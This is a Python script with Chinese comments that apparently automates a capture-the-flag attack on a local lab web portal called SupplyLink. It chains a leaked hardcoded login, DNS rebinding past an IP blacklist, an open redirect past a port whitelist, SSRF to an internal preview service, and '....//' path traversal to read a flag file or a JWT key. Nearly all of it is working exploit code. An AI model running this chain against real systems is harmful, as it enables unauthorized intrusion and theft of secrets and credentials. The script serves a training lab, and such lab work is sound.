# -*- coding: utf-8 -*-
"""SupplyLink 实验环境 —— 全自动化攻击链演示（真实 DNS Rebinding 版）

攻击链（每一步对应源码里的一个漏洞）：
  步骤 0  登录（泄露的联调账号）        login.php 第 57 行注释 / init_db.php 硬编码
  步骤 1  对照组：直接导入内网地址      被 validate_import_url() 拒绝（两个原因各演示一次）
  步骤 2  构造 jump.php 开放重定向 URL   校验只针对最外层 URL
  步骤 3  提交导入                       校验时 DNS 解析为公网 IP（第一次查询）
                                        抓取时同域名解析为 127.0.0.1（DNS Rebinding）
                                        命中 jump.php 后 302 到 127.0.0.1:8081，且不再复查
  步骤 4  内网预览服务                   REMOTE_ADDR=127.0.0.1，白名单被 SSRF 天然绕过
  步骤 5  ....// 路径穿越                str_replace 只替换一遍
  步骤 6  下载归档文件，拿到 flag

用法：先在 WSL(Kali) 里运行 start_lab.sh，再运行本脚本（Windows / WSL 里都可以）。
"""
import http.cookiejar
import random
import re
import sys
import urllib.parse
import urllib.request

PORTAL = 'http://127.0.0.1:8000'                       # 门户 A：用户操作的网站
# rebinding 域名 + 门户 B 端口；每次运行用随机子域名，保证“第一次解析”一定返回公网 IP
REBIND = 'evil-%06x.cache.rebind.huanyutech.cn:8080' % random.getrandbits(24)
# 默认读 /var/flag.txt（退两层）；也可用参数指定别的目标，例如：
#   python attack.py "....//....//....//opt/supplylink/config/jwt.key"   （任务 2：JWT 密钥，退三层）
INTERNAL_FILE = sys.argv[1] if len(sys.argv) > 1 else '....//....//flag.txt'

USERNAME = 'supplier_demo'
PASSWORD = 'Huanyu2026!'


def banner(step, text):
    print('\n' + '=' * 70)
    print('【步骤 %s】%s' % (step, text))
    print('=' * 70)


def make_opener():
    jar = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))


def post_form(opener, url, fields):
    """POST 表单并跟随跳转，返回最终页面 HTML。"""
    data = urllib.parse.urlencode(fields).encode()
    return opener.open(urllib.request.Request(url, data=data)).read().decode('utf-8', 'replace')


def extract_flash(html):
    """flash 提示在跳转后的页面里以 <div class="flash ..."> 呈现。"""
    m = re.search(r'<div class="flash flash-(\w+)">(.*?)</div>', html, re.S)
    return (m.group(1), m.group(2).strip()) if m else (None, None)


def main():
    opener = make_opener()

    # ---------- 步骤 0：登录 ----------
    banner(0, '用泄露的联调账号登录（login.php 第 57 行注释 / init_db.php 硬编码）')
    html = post_form(opener, PORTAL + '/login.php', {'username': USERNAME, 'password': PASSWORD})
    assert '工作台' in html or '归档' in html, '登录失败？'
    print('>> 登录成功，已获得 sl_token（JWT）Cookie。')

    # ---------- 步骤 1：对照组，两道防线各撞一次 ----------
    banner(1, '对照组 A：直接提交内网 IP（80 端口）')
    html = post_form(opener, PORTAL + '/import.php', {
        'source_url': 'http://127.0.0.1/debug/preview.php?file=sample.txt'
    })
    ftype, fmsg = extract_flash(html)
    print('平台返回: [%s] %s' % (ftype, fmsg))

    banner(1, '对照组 B：直接提交内网预览服务（8081 端口）')
    html = post_form(opener, PORTAL + '/import.php', {
        'source_url': 'http://127.0.0.1:8081/debug/preview.php?file=sample.txt'
    })
    ftype, fmsg = extract_flash(html)
    print('平台返回: [%s] %s' % (ftype, fmsg))
    print('>> 结论：内网 IP 被黑名单拦截；8081 不在端口白名单。两道防线都在。')

    # ---------- 步骤 2：构造恶意 URL ----------
    banner(2, '构造恶意导入 URL（rebinding 域名 + jump.php 开放重定向 + ....// 穿越）')
    inner = 'http://127.0.0.1:8081/debug/preview.php?file=' + INTERNAL_FILE
    evil = 'http://%s/jump.php?url=%s' % (REBIND, urllib.parse.quote(inner, safe=''))
    print('内层 URL（真正目标）:', inner)
    print('导入 URL（提交给平台的）:\n ', evil)
    print('>> 校验视角：域名需解析，端口 8080 在白名单 => 看起来合法')

    # ---------- 步骤 3：提交导入，Rebinding + 重定向接力 ----------
    banner(3, '提交导入：校验时解析出公网 IP，抓取时解析成 127.0.0.1（DNS Rebinding）')
    html = post_form(opener, PORTAL + '/import.php', {'source_url': evil})
    ftype, fmsg = extract_flash(html)
    print('平台返回: [%s] %s' % (ftype, fmsg))
    if ftype != 'success':
        sys.exit('导入失败，攻击链中断。请确认 start_lab.sh 已启动、DNS 已切换。')
    print('>> 时序：validate_import_url() 第一次解析 -> 93.184.216.34（公网，放行）')
    print('         file_get_contents() 第二次解析 -> 127.0.0.1（打到本机 8080 的 jump.php）')
    print('         跟随 302 -> 127.0.0.1:8081（不再复查端口/IP）')

    # ---------- 步骤 4~6：下载归档，拿到 flag ----------
    banner(4, '下载归档文件：内网预览服务的输出（含 flag）')
    html = opener.open(PORTAL + '/dashboard.php').read().decode('utf-8', 'replace')
    ids = re.findall(r'attachment_id=(\d+)', html)
    assert ids, '没有找到归档记录'
    att_id = ids[0]
    print('最新归档编号: #%s' % att_id)
    body = opener.open(PORTAL + '/download.php?attachment_id=' + att_id).read().decode('utf-8', 'replace')
    print('-' * 70)
    print(body.strip())
    print('-' * 70)

    m = re.search(r'flag\{[^}]+\}', body)
    if m:
        print('\n🚩 攻击成功，拿到 flag: %s' % m.group(0))
        print('\n回顾整条链：')
        print('  信息泄露(注释里的账号)   -> 拿到登录门票')
        print('  DNS Rebinding(TOCTOU)    -> 绕过 IP 黑名单（校验/抓取两次解析结果不同）')
        print('  开放重定向(jump.php)     -> 绕过端口白名单（302 之后不再复查）')
        print('  SSRF 发自本机            -> 绕过 preview.php 的 127.0.0.1 白名单')
        print('  ....// 双写              -> 绕过只执行一遍的 str_replace 过滤')
    else:
        print('\n没有匹配到 flag，请检查上方输出。')


if __name__ == '__main__':
    main()
